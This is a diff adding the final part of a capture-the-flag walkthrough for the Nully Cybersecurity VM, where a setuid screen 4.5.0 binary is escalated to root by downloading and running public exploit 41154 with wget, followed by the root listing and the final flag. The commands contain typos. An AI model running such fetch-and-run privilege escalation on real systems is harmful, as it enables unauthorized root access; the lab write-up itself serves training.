@@ -559,6 +559,56 @@ donald@DatabaseServer:/home$ ls -lart /usr/bin/screen-4.5.0
 screen can be run with root suid! Lets see if we can axploit that.
 There's an interesting exploit on that screen version on [exploitdb](https://www.exploit-db.com/exploits/41154):
 
-### To be continued..
+
+Lets download the exploit in the tmp dir like this:
+```
+cd /tml
+wget https://www.exploit-db.com/download/41154
+chmod +x 41154
+```
+
+Now lets try to run it:
+```
+./4154
+```
+>if it gives you this kind of error `/bin/bash^M: bad interpreter: No such file or directory` about invalid line endings then open the file with vi and `:set ff=unix` and save and exit with `:wq`
+
+Running the file should root the final server:
+
+```
+# whoami
+root
+# cd /root
+# ls -lart
+total 48
+-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
+drwxr-xr-x 1 root root 4096 Aug 26 16:56 ..
+drwxr-xr-x 3 root root 4096 Aug 27 08:57 .local
+-rw-r--r-- 1 root root 3093 Aug 27 09:31 .bashrc
+-rw-r--r-- 1 root root  166 Aug 27 09:45 .wget-hsts
+-rw-r--r-- 1 root root  543 Aug 27 14:40 3_flag.txt
+-rwxr-xr-x 1 root root  162 Aug 27 14:41 .services
+-rw------- 1 root root 8389 Aug 27 14:41 .viminfo
+drwx------ 1 root root 4096 Aug 27 14:41 .
+-rw------- 1 root root    0 Sep 19 08:33 .bash_history
+# cat 3_flag.txt
+
+    _  _   _____             _           _ _ 
+  _| || |_|  __ \           | |         | | |
+ |_  __  _| |__) |___   ___ | |_ ___  __| | |
+  _| || |_|  _  // _ \ / _ \| __/ _ \/ _` | |
+ |_  __  _| | \ \ (_) | (_) | ||  __/ (_| |_|
+   |_||_| |_|  \_\___/ \___/ \__\___|\__,_(_)
+
+   6cb25d4789cdd7fa1624e6356e0d825b                                            
+
+Congratulations on getting the final flag! 
+You completed the Nully Cybersecurity CTF.
+I will be glad if you leave a feedback. 
 
 
+Twitter https://twitter.com/laf3r_
+Discord laf3r#4754
+```
+
+### This cocludes this very enjoyable VM. Hope you had fun and enjoyed the process.
